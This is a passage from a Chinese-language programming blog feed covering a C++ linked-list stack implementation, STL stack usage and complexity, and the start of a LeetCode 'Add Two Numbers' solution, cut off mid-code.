class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># <span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">StackList</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Define node structure</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">StackNode</span>&#123;</span><br><span class="line">    <span class="keyword">private</span>:</span><br><span class="line">        <span class="type">int</span> data;</span><br><span class="line">        StackNode *next;</span><br><span class="line">    <span class="keyword">public</span>:</span><br><span class="line">        <span class="comment">//Define constructor</span></span><br><span class="line">        <span class="built_in">StackNode</span>(): <span class="built_in">data</span>(<span class="number">0</span>),<span class="built_in">next</span>(<span class="number">0</span>)&#123;</span><br><span class="line">            <span class="comment">//next = 0;</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//Define constructor with initial data</span></span><br><span class="line">        <span class="built_in">StackNode</span>(<span class="type">int</span> x):<span class="built_in">data</span>(x), <span class="built_in">next</span>(<span class="number">0</span>)&#123;&#125;</span><br><span class="line">        <span class="comment">//Define constructor with initial data and next node address</span></span><br><span class="line">        <span class="built_in">StackNode</span>(<span class="type">int</span> x, StackNode *nextNode):<span class="built_in">data</span>(x), <span class="built_in">next</span>(nextNode)&#123;&#125;;</span><br><span class="line">        <span class="keyword">friend</span> <span class="keyword">class</span> <span class="title class_">StackList</span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Define first node, and stack-related functions</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">StackList</span>&#123;</span><br><span class="line">    <span class="keyword">private</span>:</span><br><span class="line">        StackNode *top;</span><br><span class="line">        <span class="type">int</span> size;</span><br><span class="line">    <span class="keyword">public</span>:</span><br><span class="line">        <span class="built_in">StackList</span>():<span class="built_in">top</span>(<span class="number">0</span>),<span class="built_in">size</span>(<span class="number">0</span>)&#123;&#125;;</span><br><span class="line">        <span class="function"><span class="type">void</span> <span class="title">Push</span><span class="params">(<span class="type">int</span> x)</span></span>;</span><br><span class="line">        <span class="function"><span class="type">void</span> <span class="title">Pop</span><span class="params">()</span></span>;</span><br><span class="line">        <span class="function"><span class="type">bool</span> <span class="title">isEmpty</span><span class="params">()</span></span>;</span><br><span class="line">        <span class="function"><span class="type">int</span> <span class="title">Top</span><span class="params">()</span></span>;</span><br><span class="line">        <span class="function"><span class="type">int</span> <span class="title">getSize</span><span class="params">()</span></span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">StackList::Push</span><span class="params">(<span class="type">int</span> x)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">isEmpty</span>())&#123;</span><br><span class="line">        top = <span class="keyword">new</span> <span class="built_in">StackNode</span>(x);</span><br><span class="line">        size++;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//push_front() in linked list</span></span><br><span class="line">    StackNode *newNode = <span class="keyword">new</span> <span class="built_in">StackNode</span>(x);</span><br><span class="line">    <span class="comment">//Link the new node to the origin top node</span></span><br><span class="line">    newNode-&gt;next = top;</span><br><span class="line">    <span class="comment">//update top pointer</span></span><br><span class="line">    top = newNode;</span><br><span class="line">    size++;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">StackList::Pop</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">isEmpty</span>())&#123;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;Empty stack, nothing to pop out!&quot;</span> &lt;&lt; endl;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    StackNode *tempNode = top;</span><br><span class="line">    top = top-&gt;next;</span><br><span class="line">    <span class="keyword">delete</span> tempNode;</span><br><span class="line">    <span class="comment">// set tempNode to a null pointer, to prevent dangling pointer</span></span><br><span class="line">    <span class="comment">// The constructor will set the *next to  0 (NULL)</span></span><br><span class="line">    tempNode =<span class="number">0</span>;</span><br><span class="line">    size--;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">StackList::isEmpty</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>( size == <span class="number">0</span>) <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">StackList::Top</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">isEmpty</span>())&#123;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;Empty stack, nothing to return&quot;</span> &lt;&lt; endl;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">return</span> top-&gt;data;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">StackList::getSize</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> size;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    StackList sk;</span><br><span class="line">    sk.<span class="built_in">Pop</span>();</span><br><span class="line">    sk.<span class="built_in">Push</span>(<span class="number">32</span>);</span><br><span class="line">    sk.<span class="built_in">Push</span>(<span class="number">4</span>);</span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;\ntop: &quot;</span> &lt;&lt; sk.<span class="built_in">Top</span>() &lt;&lt; <span class="string">&quot;\nsize: &quot;</span> &lt;&lt; sk.<span class="built_in">getSize</span>() &lt;&lt; std::endl;        </span><br><span class="line">    sk.<span class="built_in">Push</span>(<span class="number">15</span>);</span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;\ntop: &quot;</span> &lt;&lt; sk.<span class="built_in">Top</span>() &lt;&lt; <span class="string">&quot;\nsize: &quot;</span> &lt;&lt; sk.<span class="built_in">getSize</span>() &lt;&lt; std::endl;         </span><br><span class="line">    sk.<span class="built_in">Pop</span>();</span><br><span class="line">    sk.<span class="built_in">Pop</span>();</span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;\ntop: &quot;</span> &lt;&lt; sk.<span class="built_in">Top</span>() &lt;&lt; <span class="string">&quot;\nsize: &quot;</span> &lt;&lt; sk.<span class="built_in">getSize</span>() &lt;&lt; std::endl;          </span><br><span class="line">    sk.<span class="built_in">Pop</span>();</span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;\ntop: &quot;</span> &lt;&lt; sk.<span class="built_in">Top</span>() &lt;&lt; <span class="string">&quot;\nsize: &quot;</span> &lt;&lt; sk.<span class="built_in">getSize</span>() &lt;&lt; std::endl;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>執行結果</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">Empty stack, nothing to pop out!</span><br><span class="line"></span><br><span class="line">top: 4</span><br><span class="line">size: 2</span><br><span class="line"></span><br><span class="line">top: 15</span><br><span class="line">size: 3</span><br><span class="line"></span><br><span class="line">top: 32</span><br><span class="line">size: 1</span><br><span class="line">Empty stack, nothing to return</span><br><span class="line"></span><br><span class="line">top: -1</span><br><span class="line">size: 0</span><br></pre></td></tr></table></figure><h3 id="程式碼說明-1"><a href="#程式碼說明-1" class="headerlink" title="程式碼說明"></a>程式碼說明</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">StackList</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">StackNode</span>&#123;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="type">int</span> data;</span><br><span class="line">    StackNode *next;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="built_in">StackNode</span>():<span class="built_in">data</span>(<span class="number">0</span>)&#123;</span><br><span class="line">        next = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">StackNode</span>(<span class="type">int</span> x):<span class="built_in">data</span>(x)&#123;</span><br><span class="line">        next = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">StackNode</span>(<span class="type">int</span> x, StackNode *nextNode):<span class="built_in">data</span>(x),<span class="built_in">next</span>(nextNode)&#123;&#125;;</span><br><span class="line">    <span class="keyword">friend</span> <span class="keyword">class</span> <span class="title class_">StackList</span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">StackList</span>&#123;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    StackNode *top;     <span class="comment">// remember the address of top element </span></span><br><span class="line">    <span class="type">int</span> size;           <span class="comment">// number of elements in Stack</span></span><br><span class="line"><span class="keyword">public</span>:                 </span><br><span class="line">    <span class="built_in">StackList</span>():<span class="built_in">size</span>(<span class="number">0</span>),<span class="built_in">top</span>(<span class="number">0</span>)&#123;&#125;;</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">Push</span><span class="params">(<span class="type">int</span> x)</span></span>;</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">Pop</span><span class="params">()</span></span>;</span><br><span class="line">    <span class="function"><span class="type">bool</span> <span class="title">IsEmpty</span><span class="params">()</span></span>;</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">Top</span><span class="params">()</span></span>;</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">getSize</span><span class="params">()</span></span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>StackNode 部分:</p><ul><li>首先一開始就先宣告 <code>class StackList</code>，因為在 <code>class StackNode</code> 中會先將 <code>StackList</code> 作為 friend class</li><li>接著就是定義 <code>class StackNode</code>，這裡定義了三個 constructor，分別對應三種狀況:<ul><li>未給參數，則將node中的 data 和指標初始化為0，這代表有一個single node，其資料為0</li><li>給定參數x，將node中的資料初始化為 x，而next為0，這代表single node資料為 x</li><li>給定參數x和下一個節點位址 <code>next</code>，這代表在非空stack中新增了一個節點</li></ul></li><li>之後就是將<code>StackList</code> 作為 <code>StackNode</code>　的 friend Class</li></ul><p>StackList部分:</p><ul><li>首先宣告 private 成員: <code>*top</code>, <code>size</code>，分別代表stack的頂端節點和stack的大小</li><li>之後就是 public 成員，首先一樣透過 constructor 去初始化 <code>size=0</code>, <code>top=0 (nullptr)</code></li><li>定義 <code>Push(int x)</code>, <code>Pop()</code>, <code>IsEmpty()</code>, <code>Top()</code>, <code>getSize()</code> 等函式</li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">StackList::Push</span><span class="params">(<span class="type">int</span> x)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">isEmpty</span>())&#123;</span><br><span class="line">        top = <span class="keyword">new</span> <span class="built_in">StackNode</span>(x);</span><br><span class="line">        size++;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//push_front() in linked list</span></span><br><span class="line">    StackNode *newNode = <span class="keyword">new</span> <span class="built_in">StackNode</span>(x);</span><br><span class="line">    <span class="comment">//Link the new node to the origin top node</span></span><br><span class="line">    newNode-&gt;next = top;</span><br><span class="line">    <span class="comment">//update top pointer</span></span><br><span class="line">    top = newNode;</span><br><span class="line">    size++;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>Push 函式的部分，首先一樣要確認是否式空的stack，因為這會牽涉到我們要用的constructor 是哪個，如果為空，那就建立一個新節點，<code>new StackNode(x)</code>，也就是建立一個 <code>data=x</code>的新節點，並且將 <code>top</code> 指向該節點，此時stack size 需要加上1，接著就 return main function。若stack非空，則需要實踐push_front 的功能，所以一樣新增一個新節點，這裡有兩種寫法，上面這種是透過第二個constructor 定義節點，在手動將他指向原先的top節點，再更新top指標，這裡也可以改寫成 <code>stackNode *newNode = new StackNode(x, top)</code>，然後再更新 top指標即可</li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">StackList::Pop</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">isEmpty</span>())&#123;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;Empty stack, nothing to pop out!&quot;</span> &lt;&lt; endl;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    StackNode *tempNode = top;</span><br><span class="line">    top = top-&gt;next;</span><br><span class="line">    <span class="keyword">delete</span> tempNode;</span><br><span class="line">    <span class="comment">// set tempNode to a null pointer, to prevent dangling pointer</span></span><br><span class="line">    <span class="comment">// The constructor will set the *next to  0 (NULL)</span></span><br><span class="line">    tempNode =<span class="number">0</span>;</span><br><span class="line">    size--;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>Pop函式部分，一樣會需要先確認是否為空，如果stack是空的，那就return 回 main()</li><li>如果非空，那就跟常規 Linked List 刪除節點的步驟一樣，定義暫存節點，暫時保留top節點，接著將 top　更新為下一個節點，然後刪除暫存節點的資料</li><li>最重要的一步就是要將暫存節點設為 0，也就是 <code>nullptr</code> (因為 <code>next</code> 被設成0)以防止懸空指標發生，因為指標變數還存在。</li><li>記得 stack size 要-1</li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">bool</span> <span class="title">StackList::isEmpty</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>( size == <span class="number">0</span>) <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">StackList::Top</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">isEmpty</span>())&#123;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;Empty stack, nothing to return&quot;</span> &lt;&lt; endl;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">return</span> top-&gt;data;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">StackList::getSize</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> size;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><code>isEmpty</code> 就是去檢查 <code>size</code> 大小</li><li><code>Top()</code> 一樣要先去檢查是否為空stack，如果不是就直接回傳頂端節點的資料值</li><li><code>getSize()</code> 回傳 <code>size</code></li></ul><h1 id="Stack-相關的-STL"><a href="#Stack-相關的-STL" class="headerlink" title="Stack 相關的 STL"></a>Stack 相關的 STL</h1><p>需要引入 stack template library</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># <span class="keyword">include</span> <span class="string">&lt;stack&gt;</span></span></span><br><span class="line"></span><br><span class="line">stack&lt;<span class="type">int</span>&gt; sk;</span><br></pre></td></tr></table></figure><p>尖括號內的<int>代表這個stack裡面放的都是整數<br>如果想要在stack裡面放其他型態的資料的話<br>也可以宣告成這樣</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">stack&lt;<span class="type">float</span>&gt; sk;</span><br><span class="line">stack&lt;string&gt; sk;</span><br><span class="line">stack&lt;<span class="type">char</span>&gt; sk;</span><br></pre></td></tr></table></figure><p>使用 STL 就不需要自己實作  <code>push()</code> 和 <code>pop()</code> 了</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">sk.<span class="built_in">push</span>(<span class="number">123</span>);           <span class="comment">//      | -78 |</span></span><br><span class="line">sk.<span class="built_in">push</span>(<span class="number">666</span>);           <span class="comment">//      | 666 | </span></span><br><span class="line">sk.<span class="built_in">push</span>(<span class="number">-78</span>);           <span class="comment">//      | 123 |   </span></span><br><span class="line">                        <span class="comment">//      |_____|</span></span><br></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> a = sk.<span class="built_in">pop</span>(); <span class="comment">// -78</span></span><br></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sk.<span class="built_in">top</span>(); <span class="comment">//666, since -78 is poped from stack</span></span><br></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sk.<span class="built_in">empty</span>(); <span class="comment">//return true or false</span></span><br></pre></td></tr></table></figure><h1 id="Stack-相關操作的時間複雜度"><a href="#Stack-相關操作的時間複雜度" class="headerlink" title="Stack 相關操作的時間複雜度"></a>Stack 相關操作的時間複雜度</h1><p>根據 [5] 的整理，常規 stack 操作的平均時間複雜度分別如下:</p><ul><li>Access: $O(N)$</li><li>Serach: $O(N)$</li><li>Insertion: $O(1)$</li><li>Deletion: $O(1)$</li></ul><p>$N$ 為stack中的資料數量</p><h1 id="Stack-經典LeetCode-題目"><a href="#Stack-經典LeetCode-題目" class="headerlink" title="Stack 經典LeetCode 題目"></a>Stack 經典LeetCode 題目</h1><p>Easy</p><ul><li><strong><a href="https://leetcode.com/problems/valid-parentheses/description/">20. Valid Parentheses</a></strong></li><li><strong><a href="https://leetcode.com/problems/maximum-nesting-depth-of-the-parentheses/description/">1614. Maximum Nesting Depth of the Parentheses</a></strong></li><li><strong><a href="https://leetcode.com/problems/implement-queue-using-stacks/description/">232. Implement Queue using Stacks</a></strong></li></ul><p>Medium</p><ul><li><strong><a href="https://leetcode.com/problems/simplify-path/description/?envType=study-plan-v2&envId=top-interview-150">71. Simplify Path</a></strong></li><li><strong><a href="https://leetcode.com/problems/min-stack/description/">155. Min Stack</a></strong></li><li><strong><a href="https://leetcode.com/problems/evaluate-reverse-polish-notation/description/?envType=study-plan-v2&envId=top-interview-150">150. Evaluate Reverse Polish Notation</a></strong></li></ul><p>Hard</p><ul><li><strong><a href="https://leetcode.com/problems/basic-calculator/description/?envType=study-plan-v2&envId=top-interview-150">224. Basic Calculator</a></strong></li></ul><h1 id="參考"><a href="#參考" class="headerlink" title="參考"></a>參考</h1><p>[1] <a href="https://hackmd.io/@meyr543/SksrPAEIt">https://hackmd.io/@meyr543/SksrPAEIt</a><br>[2] <a href="https://hackmd.io/@Greenleaf/advanced_cpp#%F0%9F%8E%A0-stack-%E5%A0%86%E7%96%8A">https://hackmd.io/@Greenleaf/advanced_cpp#%F0%9F%8E%A0-stack-%E5%A0%86%E7%96%8A</a><br>[3] <a href="https://alrightchiu.github.io/SecondRound/stack-yi-arrayyu-linked-listshi-zuo.html">https://alrightchiu.github.io/SecondRound/stack-yi-arrayyu-linked-listshi-zuo.html</a><br>[4] <a href="https://hackmd.io/@CLKO/BkZaF56Cm?type=view">https://hackmd.io/@CLKO/BkZaF56Cm?type=view</a><br>[5] <a href="https://www.bigocheatsheet.com/">https://www.bigocheatsheet.com/</a></p>]]></content>
      
      
      <categories>
          
          <category> LeetCode筆記 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> LeetCode </tag>
            
            <tag> Stack </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>兩鏈相加 | Medium |LeetCode#2. Add Two Numbers</title>
      <link href="/posts/3864fd1b.html"/>
      <url>/posts/3864fd1b.html</url>
      
        <content type="html"><![CDATA[<h1 id="題目敘述"><a href="#題目敘述" class="headerlink" title="題目敘述"></a>題目敘述</h1><p><img src="/img/LeetCode/2/question1.png"><br><img src="/img/LeetCode/2/question2.png"></p><ul><li>題目難度： <code>Medium</code></li><li>題目敘述：這題要求給定兩個非空的linked list來代表兩個非整數數字，兩個數字以反向排序，每一個digit被存在個別的node上，題目要求將兩個數字相加後同樣以反向存成一個linked list並回傳</li><li>舉例：可以看範例1，342 和 465 分別以反向排序儲存，並且相加後的值為 807，最後再反向初存成list，輸出 [7,0,8]</li></ul><h1 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h1><h2 id="一開始的想法"><a href="#一開始的想法" class="headerlink" title="一開始的想法"></a>一開始的想法</h2><blockquote><p>最一開始的想法大概花費10分鐘定義好，但實際上較為複雜<br>我的想法是從個別List取得個別數字，相加後，再存成list</p></blockquote><ol><li>宣告變數 a1, a2. sum</li><li>Traverse List1 長度</li><li>檢查 list1 的值，逐項相加，存入變數a1</li><li>Traverse List2 長度</li><li>檢查 list2 的值，逐項相加，存入變數a2</li><li>sum &#x3D; a1 +a2;</li><li>建立新list，反向存入sum 中的值</li><li>回傳 new list head</li></ol><h2 id="我的解法"><a href="#我的解法" class="headerlink" title="我的解法"></a>我的解法</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for singly-linked list.</span></span><br><span class="line"><span class="comment"> * struct ListNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     ListNode *next;</span></span><br><span class="line"><span class="comment"> *     ListNode() : val(0), next(nullptr) &#123;&#125;</span></span><br><span class="line"><span class="comment"> *     ListNode(int x) : val(x), next(nullptr) &#123;&#125;</span></span><br><span class="line"><span class="comment"> *     ListNode(int x, ListNode *next) : val(x), next(next) &#123;&#125;</span></span><br><span class="line"><span class="comment"> * &#125;;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">ListNode* <span class="title">addTwoNumbers</span><span class="params">(ListNode* l1, ListNode* l2)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> len1=<span class="number">0</span>, len2=<span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> val1=<span class="number">0</span>, val2=<span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> sum;</span><br><span class="line">        vector&lt;<span class="type">int</span>&gt; value1, value2;</span><br><span class="line">        ListNode * current = l1;</span><br><span class="line">        ListNode * previous;</span><br><span class="line">        ListNode * head;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//Traverse through list1, derive the length of l1</span></span><br><span class="line">        <span class="keyword">while</span>(current != <span class="literal">NULL</span>)&#123;</span><br><span class="line">            len1++;</span><br><span class="line">            current = current-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">        current = l1;</span><br><span class="line">        <span class="comment">//Derive the value of list1</span></span><br><span class="line">        <span class="keyword">while</span> (current != <span class="literal">NULL</span>)&#123;</span><br><span class="line">            value1.<span class="built_in">push_back</span>(current-&gt;val);</span><br><span class="line">            current = current -&gt; next;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        current = l2;</span><br><span class="line">        <span class="comment">//Traverse through list2, derive the length of l2</span></span><br><span class="line">        <span class="keyword">while</span>(current != <span class="literal">NULL</span>)&#123;</span><br><span class="line">            len2++;</span><br><span class="line">            current = current -&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">        current = l2;</span><br><span class="line">        <span class="comment">//Derive the value of list2</span></span><br><span class="line">        <span class="keyword">while</span>(current != <span class="literal">NULL</span>)&#123;</span><br><span class="line">            value2.<span class="built_in">push_back</span>(current-&gt;val);</span><br><span class="line">            current = current-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//value1</span></span><br><span class="line">        <span class="type">int</span> factor = value1.<span class="built_in">size</span>() <span class="number">-1</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i=value1.<span class="built_in">size</span>()<span class="number">-1</span>; i&gt;=<span class="number">0</span>; i--)&#123;</span><br><span class="line">            val1 += value1[i] * <span class="built_in">pow</span>(<span class="number">10</span>,factor);</span><br><span class="line">            factor--;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//value2</span></span><br><span class="line">        factor = value2.<span class="built_in">size</span>() <span class="number">-1</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i=value2.<span class="built_in">size</span>()<span class="number">-1</span>; i&gt;=<span class="number">0</span>; i--)&#123;</span><br><span class="line">            val2 += value2[i] * <span class="built_in">pow</span>(<span class="number">10</span>,factor);</span><br><span class="line">            factor--;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">//sum</span></span><br><span class="line">        sum = val1 + 